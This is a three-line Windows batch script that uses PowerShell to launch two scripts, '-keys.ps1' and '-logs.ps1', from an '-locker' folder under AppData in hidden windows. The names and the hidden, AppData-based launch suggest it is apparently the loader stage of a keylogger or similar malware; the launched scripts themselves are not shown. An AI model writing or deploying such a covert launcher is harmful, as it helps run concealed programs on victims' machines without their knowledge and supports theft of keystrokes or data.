@echo off
powershell Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-keys.ps1"
powershell Start-Process powershell.exe -windowstyle hidden  "$env:appdata/-locker/-logs.ps1"
